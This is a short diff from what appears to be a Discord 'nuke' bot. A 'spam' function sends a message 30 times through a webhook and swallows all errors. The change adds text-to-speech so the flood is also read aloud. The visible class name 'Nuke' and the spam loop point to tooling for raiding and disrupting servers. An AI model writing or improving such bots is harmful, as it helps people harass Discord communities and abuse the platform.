@@ -26,7 +26,7 @@ async def create_webhook(channel, message):
 	create_task(spam(webhook, message))
 async def spam(webhook, message):
 	for i in range(30):
-		try:await webhook.send(message)
+		try:await webhook.send(message, tts=True)
 		except:pass
 class Nuke(commands.Cog):
 	def __init__(self, bot):
